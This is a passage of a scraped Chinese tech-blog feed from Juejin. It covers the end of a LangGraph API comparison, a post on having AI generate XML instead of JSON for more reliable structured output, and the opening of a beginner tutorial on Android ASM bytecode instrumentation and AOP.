    step1_result: <span class="hljs-built_in">dict</span>
    analysis: <span class="hljs-built_in">dict</span>
    final_result: <span class="hljs-built_in">dict</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">should_analyze</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">"analyze"</span> <span class="hljs-keyword">if</span> state[<span class="hljs-string">"step1_result"</span>][<span class="hljs-string">"needs_analysis"</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">"simple_path"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">confidence_check</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">"high_confidence"</span> <span class="hljs-keyword">if</span> state[<span class="hljs-string">"analysis"</span>][<span class="hljs-string">"confidence"</span>] &gt; <span class="hljs-number">0.8</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"low_confidence"</span>

workflow = StateGraph(WorkflowState)
workflow.add_node(<span class="hljs-string">"step1"</span>, process_step1_node)
workflow.add_conditional_edges(<span class="hljs-string">"step1"</span>, should_analyze)
workflow.add_node(<span class="hljs-string">"analyze"</span>, analyze_data_node)
workflow.add_conditional_edges(<span class="hljs-string">"analyze"</span>, confidence_check)
<span class="hljs-comment"># ... add remaining nodes and edges</span>
</code></pre>
<h3 data-id="heading-15">4.2 从图API迁移至函数式API</h3>
<p>当对于简单的线性流程而言，你的图结构变得过于复杂时</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Before: Over-engineered Graph API</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-built_in">input</span>: <span class="hljs-built_in">str</span>
    step1: <span class="hljs-built_in">str</span>
    step2: <span class="hljs-built_in">str</span>
    result: <span class="hljs-built_in">str</span>

<span class="hljs-comment"># After: Simplified Functional API</span>
<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_workflow</span>(<span class="hljs-params">input_data: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    step1 = process_step1(input_data).result()
    step2 = process_step2(step1).result()
    <span class="hljs-keyword">return</span> finalize_result(step2).result()
</code></pre>
<h2 data-id="heading-16">五、总结</h2>
<p>当你需要对工作流结构进行显式控制、处理复杂分支、实现并行处理，或希望借助团队协作优势时，请选择图API（Graph API）。
当你希望以最少的改动为现有代码添加LangGraph功能、处理简单的线性工作流，或需要快速原型开发能力时，请选择函数式API（Functional API）。
两种 API 均提供相同的LangGraph核心功能（包括持久化、流式处理、人机协同、内存管理），但采用不同的范式进行封装，以适配不同的开发风格和使用场景。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它]]></title>    <link>https://juejin.cn/post/7575457788664332340</link>    <guid>https://juejin.cn/post/7575457788664332340</guid>    <pubDate>2025-11-24T03:06:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788664332340" data-draft-id="7575563462047170595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-11-24T03:06:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="葡萄城技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3227821868332765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821868332765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    葡萄城技术团队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:06:46.000Z" title="Mon Nov 24 2025 03:06:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近，我们团队在调查开发AI辅助功能，需要模型生成内部配置（JSON元数据）时，我们遇到了一个令人困惑的悖论：市面上的AI模型可以轻松生成结构完整、样式美观的HTML页面，但当我们需要它生成工具所需的JSON配置时，结果却惨不忍睹。这直接影响了AI辅助开发功能的可靠性。</p>
<h2 data-id="heading-0">问题的发现：从“完美”到“破碎”的对比</h2>
<p>我们对AI生成HTML的能力印象深刻。只需简单的提示，AI就能生成结构完整、可用的页面代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎使用活字格低代码开发平台<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个由AI生成的示例页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>但当目标转向生成内部使用的JSON配置时，情况急转直下：</p>
<pre><code class="hljs language-JSON" lang="JSON">'''json<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"components"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"container"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"children"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-comment">/* ... 更多内容 ... */</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-comment">// 致命错误：缺少闭合的括号、多余的逗号或引号缺失</span>
</code></pre>
<p>类似的结构错误层出不穷，<strong>导致</strong>JSON解析器立即报错，功能彻底中断。</p>
<h2 data-id="heading-1">深入分析：为什么AI对HTML和JSON区别对待？</h2>
<h3 data-id="heading-2">1.容错性的根本差异：警察与保姆</h3>
<p><strong>HTML</strong>：宽容的保姆</p>
<ul>
<li>浏览器是天然的“错误修复器”。缺失闭合标签？属性未加引号？浏览器会尽力修复并正常渲染。</li>
<li><strong>结果导向：</strong> 只要页面看起来正常，微小的语法错误可以被忽略。</li>
</ul>
<p><strong>JSON</strong>：严格的警察</p>
<ul>
<li>JSON解析器是“零容忍的语法警察”。</li>
<li>一个多余的逗号、缺失的双引号都会导致解析失败。</li>
<li><strong>非黑即白：</strong> 要么完全正确，要么彻底失败。</li>
</ul>
<h3 data-id="heading-3">2.AI工作方式的局限性：概率而非精确</h3>
<p>大型语言模型本质上是基于概率的文本生成器，而不是精确的代码编译器：</p>
<ul>
<li><strong>HTML</strong>生成： 即使中间有错误，模型可以靠上下文“蒙”对下一个标签，最终结果可能仍然可用。</li>
<li><strong>JSON</strong>生成： 必须从第一个<code>{</code>到最后一个<code>}</code>完美无缺。AI生成中的微小错误都会在解析时被放大。</li>
</ul>
<h3 data-id="heading-4">3.训练数据的偏好与结构“锚点”</h3>
<p>AI在训练过程中接触了大量的HTML代码，这些代码拥有清晰、稳定的结构。更关键的是，XML和HTML都有<strong>强制性的闭合标签</strong>（如<code>&lt;tag&gt;</code>必须对应<code>&lt;/tag&gt;</code>），为AI提供了明确的<strong>结构“<strong>锚点</strong>”</strong>，帮助模型维持层级完整性。JSON缺乏这种自检机制。</p>
<h2 data-id="heading-5">突破性发现：被遗忘的“老兵”——XML的意外复兴</h2>
<p>在尝试了各种复杂的JSON校正方案后，我们想到了一个看似“复古”的解决方案：让AI生成XML而不是JSON。</p>
<p>结果令人惊喜：AI生成的XML结构正确率大幅提升！</p>
<pre><code class="hljs language-Plain" lang="Plain">&lt;page&gt;
  &lt;container&gt;
    &lt;header&gt;欢迎使用活字格低代码开发平台&lt;/header&gt;
    &lt;main&gt;这是一个由AI生成的示例页面&lt;/main&gt;
  &lt;/container&gt;&lt;/page&gt;
</code></pre>
<h3 data-id="heading-6">为什么XML效果更好？</h3>
<ol>
<li><strong>与HTML</strong>的高度相似性： XML和HTML共享相同的标签语法，AI对这种模式的掌握程度远超JSON。</li>
<li><strong>明确的“<strong>锚点”机制： 每个<code>&lt;tag&gt;</code>都有对应的<code>&lt;/tag&gt;</code>，为AI提供了清晰、不可或缺的</strong>闭合锚点</strong>，极大地帮助模型维持结构完整性。</li>
<li><strong>线性生成</strong>更符合AI思维： AI可以自然地按顺序处理：开标签 → 内容 → 闭标签。这是一种更“自然”的文本生成流程。</li>
</ol>
<h2 data-id="heading-7">我们的“XML中转策略”</h2>
<p>有没有和HTML类似，也可以JSON能力类似的技术？答案就是我们的老朋友XML。于是我们构建了一个简单的流程，将AI擅长生成的结构（XML）转化为我们需要的配置结构（JSON）。</p>
<h3 data-id="heading-8">第一步：让AI生成XML</h3>
<p>我们要求AI根据用户需求生成目标配置的XML表示</p>
<h3 data-id="heading-9">第二步：内部轻量级转换</h3>
<p>我们让产品支持导入XML，然后在产品内部将自己的标准功能导出为目标JSON格式。我们不依赖AI来处理JSON的严格语法，而是依赖内部工具来进行格式转换。</p>
<h3 data-id="heading-10">第三步：验证和优化</h3>
<ul>
<li>XML解析器本身能快速自动检测结构错误，帮助定位问题。</li>
<li>在转换过程中进行严格的数据验证。</li>
</ul>
<h2 data-id="heading-11">性能与效果：数据不会说谎</h2>
<p>在我们进行的测试中，XML中转策略带来了质的飞跃：</p>

























<table><thead><tr><th>指标</th><th>直接生成JSON</th><th>通过XML中转</th></tr></thead><tbody><tr><td>结构正确率</td><td>65-75%</td><td>92-98%</td></tr><tr><td>错误定位难度</td><td>困难</td><td>容易</td></tr><tr><td>可靠性</td><td>低</td><td>极高</td></tr></tbody></table>
<h2 data-id="heading-12">结论与启示</h2>
<p>通过引入XML作为AI生成的中间格式，我们成功解决了JSON生成不可靠的顽疾。</p>
<p>这个案例告诉我们：<strong>技术选型不应盲目追求新潮，而应选择最适合AI“心智模型”的工具。</strong> XML虽然在现代编程中不再时髦，但在“与AI协作生成结构化数据”这一特定场景下，它展现了比JSON更高的可靠性。</p>
<p>实践证明：<strong>在AI生成内部配置的场景中，XML确实比</strong>JSON<strong>更加可靠。</strong> 这一“复古”的解决方案为所有面临AI结构化数据生成挑战的开发者提供了新的思路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从喝水到学会 Android ASM 插桩]]></title>    <link>https://juejin.cn/post/7575751471841853476</link>    <guid>https://juejin.cn/post/7575751471841853476</guid>    <pubDate>2025-11-24T03:05:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841853476" data-draft-id="7573890735579103242" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从喝水到学会 Android ASM 插桩"/> <meta itemprop="keywords" content="Android,Android Studio,Kotlin"/> <meta itemprop="datePublished" content="2025-11-24T03:05:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="bqliang"/> <meta itemprop="url" content="https://juejin.cn/user/941602739853453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从喝水到学会 Android ASM 插桩
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/941602739853453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    bqliang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:05:39.000Z" title="Mon Nov 24 2025 03:05:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读34分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>首先，老手请绕道。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c7b00566ac04c648712d727552d918a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=KKsvMK8If%2F3oY9y0H6MhVzL9MUY%3D" alt="header" loading="lazy"/></p>
<p>很久前点开了一篇 ASM 的文章，很长，不少陌生的术语，对彼时的我来说有点复杂，大概翻了翻后：噢，一个可以修改字节码的东西。厉害！但反正我用不上，便关掉了页面，往后我对 ASM 的认识一直停留于此。</p>
<p>后来，工作学习中常听到</p>
<ul>
<li>Transform 接口废弃（尤其是 AGP 升级 7.0 那会）</li>
<li>无痕埋点</li>
<li>插桩</li>
</ul>
<p>一直听说这些词，但却不明所以。好吧，是时候学习一下了。</p>
<h2 data-id="heading-0">什么是"插桩"与 "AOP"？</h2>
<p>当我大概知道 ASM 是一个修改字节码的工具后，最让我好奇的不是怎么去使用它，反倒是大量出现在相关文章里的两个词——“插桩”、“AOP 切面编程”。</p>
<p>我一直都有个疑问，为什么修改字节码叫作“插桩”而不是“插码”？AOP 切面编程又是什么意思？</p>
<h3 data-id="heading-1">插桩 Instrumentation</h3>
<p>"插桩" 对应的英文是 "Instrumentation"，这个词是 Instrument 的变体/衍生词。</p>
<p>"Instrument" 是“仪器”、“仪表”的意思（比如飞机驾驶舱里的各种仪表盘）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09455fda9310403daeb1b2083dd52249~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=T0i2ssOaUr2Lqn4lXFUzJSQmDdQ%3D" alt="instrumentation.png" loading="lazy"/></p>
<p>至于 "Instrumentation"，其本意是“<strong>给……装上仪器</strong>”这个动作。比如给工厂的管道装上压力计和温度计，以便于监控它的运行状态，这个过程就叫做 "Instrumentation"。</p>
<p>这个词被软件行业借用过来，意思是：给“程序”装上“监控仪器”（也就是额外的代码），以便监控它的运行状态。</p>
<p>那“插桩”又该怎么理解呢？</p>
<ul>
<li>“插”：插入，这个很好理解，修改字节码就是把代码“插”进入；</li>
<li>“桩”：桩子，木桩，其实就是上面“仪器”的隐喻，在编程里指的是我们插入的代码。</li>
</ul>
<p>想象一下，你现在是一个土木工程师，要测量一条河流的几个关键点的水位变化，或者要标记一块地的重要坐标。你会在这些关键点“插入一个个“桩子”（测量桩 / 标记桩）。</p>
<p>在软件工程里，我们的“河流”就是程序的执行流。我们想要监控的“关键点”一般是：</p>
<ul>
<li>方法出/入口</li>
<li>一个循环的内部</li>
<li>异常被抛出的地方</li>
</ul>
<p>我们插入的代码，就像一个个“桩子”，被安插在这些关键点上，起到“测量”或“标记”的作用（比如：记录方法耗时、打印日志、上报分析数据）。</p>
<hr/>
<p>那如果我疯了，我非要用书写字节码的方式来实现业务逻辑，比如判断用户输入的字符串是否为手机号，这个过程算不算“插桩”？从广义上说，算。但 "插桩" 这个词，它侧重强调的是插入代码的“目的”。"插桩" 插入的代码（那个“桩”），其目的不是为了实现业务逻辑，而是为了：</p>
<ul>
<li>监控 (Monitoring): 比如 APM 里的性能监控；</li>
<li>调试 (Debugging): 比如打印日志；</li>
<li>分析 (Analytics): 比如埋点上报；</li>
<li>控制 (Control): 比如在方法执行前进行权限检查（AOP 的一种体现）；</li>
</ul>
<p>所以，"插桩" 特指那些为了“监控和测量”而插入的非业务代码。</p>
<h3 data-id="heading-2">AOP 切面编程</h3>
<p>AOP 即“面向切面编程”，它是一种编程思想，就像 OOP 面向对象编程一样。</p>
<p>我们先不纠结于“切面”这个词，它听起来和“插桩”一样抽象。我们先来看一个面向对象编程中很常见的“痛点”。</p>
<p>我们都知道，面向对象的核心思想是“封装、继承、多态”。它允许我们将数据（属性）和操作这些数据的逻辑（方法）“封装”到一个“类”（Class）里。</p>
<p>比如，下面定义一个 <code>Person</code> 类，它封装了 <code>name</code> 属性和 <code>eat()</code> 方法。然后再定义一个 <code>Student</code> 类，它继承自 <code>Person</code> 类，并封装了 <code>study()</code> 方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-keyword">val</span> name: String) {
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 正在吃饭..."</span>)
    Thread.sleep(<span class="hljs-number">100</span>) <span class="hljs-comment">// 模拟吃饭耗时</span>
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(name: String, <span class="hljs-keyword">val</span> studentId: String) : Person(name) {
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">study</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 正在学习..."</span>)
    Thread.sleep(<span class="hljs-number">200</span>) <span class="hljs-comment">// 模拟学习耗时</span>
  }
}
</code></pre>
<p><code>Person</code> 和 <code>Student</code> 之间形成了一条清晰的垂直继承链。<code>Student</code> 是一个 <code>Person</code>，它在 <code>Person</code> 的基础上“垂直”地构建了更具体的功能。</p>
